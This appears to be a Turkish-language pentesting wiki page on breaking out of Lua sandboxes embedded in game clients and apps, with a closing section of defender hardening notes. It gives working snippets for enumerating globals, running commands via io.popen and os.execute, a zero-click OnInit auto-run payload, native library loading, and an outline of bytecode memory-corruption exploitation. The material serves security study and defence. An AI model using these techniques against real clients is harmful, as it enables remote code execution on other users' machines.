# Lua sandbox’larını aşma (embedded VM’ler, game client’ları)

Bu sayfa, uygulamalara gömülü Lua "sandbox"’larını (özellikle game client’ları, plugin’ler veya uygulama içi scripting engine’leri) enumerate etmek ve bunlardan breakout gerçekleştirmek için pratik teknikleri derler. Birçok engine kısıtlı bir Lua environment’ı sunar, ancak arbitrary command execution’a veya bytecode loader’ları exposed olduğunda native memory corruption’a olanak sağlayan güçlü global’leri erişilebilir bırakır.

Temel fikirler:
- VM’i bilinmeyen bir environment olarak ele alın: _G’yi enumerate edin ve hangi dangerous primitive’lerin erişilebilir olduğunu keşfedin.
- stdout/print engellendiğinde, sonuçları gözlemlemek için VM içindeki herhangi bir UI/IPC channel’ını output sink olarak kötüye kullanın.
- io/os exposed durumdaysa, genellikle doğrudan command execution elde edersiniz (io.popen, os.execute).
- load/loadstring/loadfile exposed durumdaysa, crafted Lua bytecode çalıştırmak bazı version’larda memory safety’yi subvert edebilir (≤5.1 verifier’lar bypass edilebilir; 5.2 verifier’ı kaldırdı) ve advanced exploitation’ı mümkün kılar.

## Sandbox environment’ını enumerate etme

- Erişilebilir table/function’ların envanterini çıkarmak için global environment’ı dump edin:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Eğer print() kullanılamıyorsa, VM içi kanalları yeniden amaçlandırın. Örneğin, chat çıktısının yalnızca bir sound çağrısından sonra çalıştığı bir MMO housing script VM'sinde, aşağıdaki kod güvenilir bir çıktı işlevi oluşturur:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Hedefiniz için bu kalıbı genelleştirin: string kabul eden herhangi bir textbox, toast, logger veya UI callback, reconnaissance için stdout görevi görebilir.

## io/os exposed ise doğrudan command execution

Sandbox hâlâ standart io veya os kütüphanelerini expose ediyorsa, muhtemelen anında command execution elde edebilirsiniz:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notlar:

- Çalıştırma client process içinde gerçekleşir; external debugger'ları engelleyen birçok anti-cheat/antidebug katmanı, in-VM process creation işlemini engelleyemez.
- Ayrıca şunları da kontrol edin: package.loadlib (arbitrary DLL/.so loading), native modules ile require, mevcutsa LuaJIT'in ffi özelliği ve debug library (VM içinde privileges yükseltebilir).

## auto-run callbacks ile Zero-click triggers

Host application client'lara script gönderiyorsa ve VM auto-run hooks (ör. OnInit/OnLoad/OnEnter) sunuyorsa, script yüklenir yüklenmez drive-by compromise gerçekleştirmek için payload'unuzu buraya yerleştirin:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Herhangi bir eşdeğer callback (OnLoad, OnEnter vb.), script'ler client'a otomatik olarak iletilip çalıştırıldığında bu tekniği genelleştirir.

## Recon sırasında aranacak tehlikeli primitive'ler

_G enumeration sırasında özellikle şunları arayın:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: source veya bytecode çalıştırır; güvenilmeyen bytecode yüklemeyi destekler.
- package, package.loadlib, require: dynamic library loading ve module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo ve hooks.
- LuaJIT-only: native code'u doğrudan çağırmak için ffi.cdef, ffi.load.

Ulaşılabiliyorsa minimal kullanım örnekleri:

Lua'nın loader API'si sürümler arasında değişmiştir: Lua 5.1'de `load` bir reader function'dan, `loadstring` ise bir string'den okur; Lua 5.2'nin `load` işlevi bir string'i veya reader function'ı kabul eder ve `loadstring`, eşdeğeri olarak deprecated durumdadır.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## İsteğe bağlı escalation: Lua bytecode loaders'ı kötüye kullanma

load/loadstring/loadfile erişilebilir durumdayken io/os kısıtlanmışsa, hazırlanmış Lua bytecode'un çalıştırılması memory disclosure ve corruption primitive'lerine yol açabilir. Temel bilgiler:
- Lua ≤ 5.1, bilinen bypass'lara sahip bir bytecode verifier ile birlikte dağıtıldı.<sup>[[4]](#references)</sup>
- Lua 5.2, verifier'ı tamamen kaldırdı (resmî yaklaşım: uygulamalar precompiled chunk'ları doğrudan reddetmelidir); bu da bytecode loading yasaklanmamışsa attack surface'i genişletti.<sup>[[2]](#references)[[3]](#references)</sup>
- İş akışları genellikle şu şekildedir: in-VM output aracılığıyla pointer'ları leak etmek, type confusion oluşturmak için bytecode hazırlamak (ör. FORLOOP veya diğer opcode'lar çevresinde), ardından arbitrary read/write ya da native code execution'a pivot etmek.<sup>[[2]](#references)[[4]](#references)</sup>

Bu yol engine/version-specific'tir ve RE gerektirir. Ayrıntılı incelemeler, exploitation primitive'leri ve oyunlardaki örnek gadget'lar için references bölümüne bakın.

## Detection and hardening notes (for defenders)

- Server side: user script'lerini reddedin veya yeniden yazın; güvenli API'leri allowlist'e alın; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug ve ffi'yi kaldırın veya boş bağlayın.
- Client side: Lua'yı minimal bir _ENV ile çalıştırın, bytecode loading'i yasaklayın, strict bir bytecode verifier veya signature checks yeniden ekleyin ve client process'ten process creation'ı engelleyin.
- Telemetry: script load işleminden kısa süre sonra gerçekleşen gameclient → child process creation olayları için alert oluşturun; bunları UI/chat/script event'leriyle ilişkilendirin.

## References

- [1] [AION client'ta (housing Lua VM) on yıllık RCE: This House is Haunted](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Factorio'nun Lua Security Flaws'larını çözümlemek](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Bytecode verifier'ın kaldırılmasının tartışılması](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua 5.1 bytecode'unu exploit etmek (verifier bypass'ları/notları içeren gist)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
